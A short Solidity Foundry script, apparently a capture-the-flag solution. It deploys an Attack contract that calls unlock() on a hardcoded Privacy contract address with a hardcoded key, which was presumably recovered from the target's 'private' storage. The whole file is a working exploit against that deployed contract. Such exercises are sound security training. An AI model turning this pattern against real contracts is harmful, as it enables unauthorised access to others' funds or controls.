// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Privacy.sol";

contract PrivacyScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        new Attack();

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor() {
        Privacy target = Privacy(0x53d46C471116dDA1611f260F10B5a23fAf1655f4);
        target.unlock(0xaf64536acd5bf9befd9f8b44a7760a42);
    }

}